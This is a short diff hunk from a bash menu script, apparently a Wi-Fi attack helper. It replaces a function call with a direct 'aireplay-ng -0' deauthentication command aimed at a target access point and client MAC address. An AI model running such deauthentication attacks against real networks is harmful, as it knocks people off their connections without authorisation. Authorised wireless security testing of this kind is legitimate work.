@@ -319,7 +319,7 @@ while true; do
             clear
             printf "Running Aireplay Attack again...\n"
             sleep 2
-            start_aireplay_attack
+            sudo aireplay-ng -0 $packetct -a $BSSID -c $MAC $INF
             ;;
         3)
             clear
